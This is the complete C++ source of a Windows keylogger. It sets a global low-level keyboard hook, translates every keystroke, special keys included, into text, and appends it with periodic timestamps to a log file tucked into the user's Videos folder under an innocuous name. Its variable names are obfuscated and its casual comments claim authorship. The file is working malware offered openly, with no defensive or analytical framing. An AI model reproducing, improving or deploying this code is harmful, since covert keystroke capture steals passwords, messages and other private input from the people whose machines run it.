#include <windows.h>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <chrono>
#include <ctime>
#include <thread>
#include <string>
using namespace std;
// lmao no one gon kkep da name
string qxdldf = getenv("USERPROFILE");
string vszop = qxdldf + "\\Videos\\Screen\\LogScreenDrxvain.txt";
ofstream skjfh;
// create the directory if it doesnt rlly exist
void drxvain() {
    filesystem::create_directories(qxdldf + "\\Videos\\Screen");
    skjfh.open(vszop, ios::app);
}
// time
string theone() {
    time_t now = time(0);
    char buf[80];
    strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S] ", localtime(&now));
    return string(buf);
}
//file to say dats by me lmao
void shouldimakeitreadable() {
    skjfh << "\n=== " << theone() << "klog by drexvain       ===\n";
    skjfh.flush();
}

LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;
        string key;
// check if its a special key bcz we cant see it on the log fileee
        switch (vk) {
            case VK_BACK: key = "[BACKSPACE]"; break;
            case VK_RETURN: key = "[ENTER]\n"; break;
            case VK_TAB: key = "[TAB]"; break;
            case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: key = "[SHIFT]"; break;
            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: key = "[CTRL]"; break;
            case VK_MENU: case VK_LMENU: case VK_RMENU: key = "[ALT]"; break;
            case VK_ESCAPE: key = "[ESC]"; break;
            case VK_SPACE: key = " "; break;
            case VK_DELETE: key = "[DEL]"; break;
            case VK_CAPITAL: key = "[CAPS]"; break;
            case VK_LEFT: key = "[LEFT]"; break;
            case VK_RIGHT: key = "[RIGHT]"; break;
            case VK_UP: key = "[UP]"; break;
            case VK_DOWN: key = "[DOWN]"; break;
            default:
                if (vk >= VK_F1 && vk <= VK_F12)
                    key = "[F" + to_string(vk - VK_F1 + 1) + "]";
                else {
                    BYTE kbState[256];
                    GetKeyboardState(kbState);
                    WCHAR buff[3] = {0};
                    if (ToUnicode(vk, p->scanCode, kbState, buff, 2, 0) == 1)
                        key = string(1, (char)buff[0]);
                    else
                        key = "[" + to_string(vk) + "]";
                }
        }

        skjfh << key;
        skjfh.flush();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
//timeee
void periodicTimeLogger() {
    while (true) {
        this_thread::sleep_for(chrono::minutes(5));
        skjfh << "\n--- " << theone() << "---\n";
        skjfh.flush();
    }
}
// da brain
int main() {
    drxvain();
    shouldimakeitreadable();
    thread t(periodicTimeLogger);
    t.detach();

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}
    UnhookWindowsHookEx(hook);
    return 0;
}
